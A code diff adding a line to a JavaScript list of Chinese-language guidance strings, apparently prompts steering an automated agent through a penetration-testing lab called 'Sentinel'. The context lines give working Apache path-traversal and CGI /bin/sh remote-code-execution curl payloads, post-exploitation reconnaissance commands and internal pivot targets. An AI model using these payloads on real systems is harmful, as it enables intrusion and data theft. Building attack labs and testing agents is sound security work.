@@ -12,6 +12,7 @@ export function recommendTargetGuide(config = {}, context = {}) {
       "entry01 文件读取: 优先验证 /icons/ 路径穿越读取 /flag.txt：curl --path-as-is 'http://<host>/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag.txt'。再尝试 /cgi-bin/ 变体；/cgi-bin/ 返回 503 不代表 /icons/ 文件读取失败。",
       "entry01 RCE: 只有 /cgi-bin/printenv 或 /cgi-bin/.../bin/sh 能正常执行时才算 RCE 可用；通过 CGI 执行 /bin/sh：curl --path-as-is --data 'echo Content-Type: text/plain; echo; id' 'http://<host>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'。每次 POST 新命令获取输出。",
       "entry01 取证: RCE 后执行 id、whoami、hostname、pwd、uname -a、ip addr、ip route、cat /etc/hosts、env | sort、command -v curl python3 bash sh ftp。",
+      "拓扑记录: 每次确认 Sentinel 内网事实后，在【拓扑事实】写清楚 networks/hosts/services/routes/flagEvidence；例如 entry01 的 10.92.10.x 地址、经 10.92.10.20 到 10.92.20/30 的路由、每个 flag 的真实所在主机和方法。只记录远程命令或 HTTP 响应证明过的内容。",
       "Apache CGI RCE 限制: 每次命令通过 POST body 传给 /bin/sh，输出通过 HTTP 响应返回；不要用管道、&& 或交互式命令。简单命令逐条执行。",
       "内网范围: 从 ip route、LAB_ROUTES、hosts 推导；Sentinel 常见证据会指向 10.92.20.0/24 和 10.92.30.0/24 经 10.92.10.20。",
       "无 proxy 服务发现: 在 entry01 上用 curl 验证少数固定候选，不要全网扫；优先 10.92.20.10:80、10.92.20.11:8983、10.92.20.20:80、10.92.30.30:5984、10.92.30.40:21、10.92.30.50:9000/9001。",
